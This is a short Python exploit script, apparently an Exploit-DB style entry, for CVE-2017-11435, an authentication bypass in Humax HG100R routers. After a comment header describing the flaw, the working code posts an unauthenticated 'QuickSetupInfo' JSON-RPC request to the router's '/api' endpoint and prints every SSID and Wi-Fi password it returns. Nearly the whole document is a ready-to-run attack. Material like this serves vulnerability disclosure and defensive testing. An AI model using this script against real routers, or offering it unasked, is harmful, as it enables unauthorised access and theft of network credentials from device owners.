# coding: utf-8

# Exploit Title: Humax HG100R-* Authentication Bypass
# Date: 14/09/2017
# Exploit Author: Kivson
# Vendor Homepage: http://humaxdigital.com
# Version: VER 2.0.6
# Tested on: OSX Linux
# CVE : CVE-2017-11435


# The Humax Wi-Fi Router model HG100R-* 2.0.6 is prone to an authentication bypass vulnerability via specially
# crafted requests to the management console. The bug is exploitable remotely when the router is configured to
# expose the management console.
# The router is not validating the session token while returning answers for some methods in url '/api'.
# An attacker can use this vulnerability to retrieve sensitive information such
# as private/public IP addresses, SSID names, and passwords.

import sys
import requests


def print_help():
    print('Exploit syntax error, Example:')
    print('python exploit.py http://192.168.0.1')


def exploit(host):
    print(f'Connecting to {host}')
    path = '/api'
    payload = '{"method":"QuickSetupInfo","id":90,"jsonrpc":"2.0"}'

    response = requests.post(host + path, data=payload)
    response.raise_for_status()

    if 'result' not in response.json() or 'WiFi_Info' not in response.json()['result'] or 'wlan' not in \
            response.json()['result']['WiFi_Info']:
        print('Error, target may be no exploitable')
        return

    for wlan in response.json()['result']['WiFi_Info']['wlan']:
        print(f'Wifi data found:')
        print(f'    SSID: {wlan["ssid"]}')
        print(f'    PWD: {wlan["password"]}')


def main():
    if len(sys.argv) < 2:
        print_help()
        return
    host = sys.argv[1]
    exploit(host)


if __name__ == '__main__':
    main()